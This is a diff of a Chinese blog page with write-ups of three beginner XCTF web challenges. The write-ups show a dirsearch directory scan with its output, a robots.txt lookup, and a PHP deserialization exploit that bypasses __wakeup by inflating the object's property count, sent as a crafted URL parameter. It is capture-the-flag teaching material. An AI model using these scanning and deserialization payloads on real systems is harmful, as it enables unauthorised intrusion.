@@ -241,50 +241,34 @@
 </ol>
 </blockquote>
 <hr>
-<h1 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5411&page=1" target="_blank" rel="noopener">baby_web</a></h1><p>​    进入页面之后，重定向到了1.php，认为有问题，因此使用了网页搜索工具dirsearch</p>
+<h1 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5411&amp;page=1" target="_blank" rel="noopener">baby_web</a></h1><p>​    进入页面之后，重定向到了1.php，认为有问题，因此使用了网页搜索工具dirsearch</p>
 <h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://220.249.52.133:40885 -e*</span><br></pre></td></tr></table></figure>
-
 <p><strong>output:</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[19:22:07] 403 -  306B  - /.htaccess.bak1</span><br><span class="line">[19:22:07] 403 -  306B  - /.htaccess.orig</span><br><span class="line">[19:22:07] 403 -  308B  - /.htaccess.sample</span><br><span class="line">[19:22:07] 403 -  306B  - /.htaccess.save</span><br><span class="line">[19:22:07] 403 -  304B  - /.htaccessBAK</span><br><span class="line">[19:22:07] 403 -  304B  - /.htaccessOLD</span><br><span class="line">[19:22:07] 403 -  305B  - /.htaccessOLD2</span><br><span class="line">[19:22:07] 403 -  303B  - /.httr-oauth</span><br><span class="line">[19:22:15] 200 -   11B  - /1.php</span><br><span class="line">[19:23:08] 302 -   17B  - /index.php  -&gt;  1.php</span><br><span class="line">[19:23:08] 302 -   17B  - /index.php/login/  -&gt;  1.php</span><br><span class="line">[19:23:30] 403 -  305B  - /server-status</span><br><span class="line">[19:23:30] 403 -  306B  - /</span><br></pre></td></tr></table></figure>
-
-<p>发现了奇怪的302信息：/index，去路由到/index康康，发现302的response中有flag，结题</p>
-<a id="more"></a>
-<h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4748&page=1" target="_blank" rel="noopener">Training-WWW-Robots</a></h1><p>​    看题目知道，是关于<a href="https://www.cnblogs.com/benpao1314/p/11352276.html" target="_blank" rel="noopener">robots.txt</a>的,因此我们可以直接访问robots.txt路由/robots.txt</p>
+<p>发现了奇怪的302信息：/index，去路由到/index康康，发现302的response中有flag，结题<br><a id="more"></a></p>
+<h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4748&amp;page=1" target="_blank" rel="noopener">Training-WWW-Robots</a></h1><p>​    看题目知道，是关于<a href="https://www.cnblogs.com/benpao1314/p/11352276.html" target="_blank" rel="noopener">robots.txt</a>的,因此我们可以直接访问robots.txt路由/robots.txt</p>
 <h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>​    <strong>output:</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fl0g.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>
-
 <p>看到了类似于flag的路由，过去直接发现路由</p>
-<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4821&page=1" target="_blank" rel="noopener">unserialize3</a></h1><p>​    根据题目来看，这题是关于反序列化的</p>
+<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4821&amp;page=1" target="_blank" rel="noopener">unserialize3</a></h1><p>​    根据题目来看，这题是关于反序列化的</p>
 <p>​    访问地址：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
-
 <p>​     <del>发现这php语法错误，少一括号</del>看到了?code=，察觉到是get传参code，应该是传序列化的类，之后番序列化出flag</p>
 <p>​    我们把这个类序列化：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> xctf();</span><br><span class="line">$c = serialize($b);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br></pre></td></tr></table></figure>
-
 <p><strong>output</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
 <p>我们直接写入code参数中:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:32505/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</span><br></pre></td></tr></table></figure>
-
 <p><strong>output</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bad requests</span><br></pre></td></tr></table></figure>
-
-
-
 <p>这时意识到了，经过了反序列化经过了__wakeup()魔术方法，导致了bad requests被打印出来。</p>
 <h2 id="如何绕过php反序列化的-wakeup-方法呢？"><a href="#如何绕过php反序列化的-wakeup-方法呢？" class="headerlink" title="如何绕过php反序列化的__wakeup()方法呢？"></a>如何绕过php反序列化的__wakeup()方法呢？</h2><blockquote>
 <p>在反序列化的操作中，如果给出的参数数量和真正的参数数量对不上，则会跳过__wakeup()方法</p>
-</blockquote>
-<blockquote>
 <p>例如，<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>,我们若改成：<code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>，给出的参数数量为2，可实际只有一个，就会绕过导致__wakeup()方法</p>
 </blockquote>
 <p>重新路由：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:32505/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</span><br></pre></td></tr></table></figure>
-
 <p>拿到了flag</p>
 
     
@@ -555,6 +539,14 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">node</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">《了不起的Node JS 将JavaScript进行到底》</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">容斥</a>
               </li>
              
@@ -563,7 +555,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">深度优先搜索</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">动态规划</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -571,15 +563,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">动态规划</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">深度优先搜索</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">并查集</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">分治法</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -588,6 +576,10 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">数据结构</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">分治法</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -604,14 +596,6 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">最小生成树</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">node</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">《了不起的Node JS 将JavaScript进行到底》</a>
               </li>
              
               <li class="article-tag-list-item">
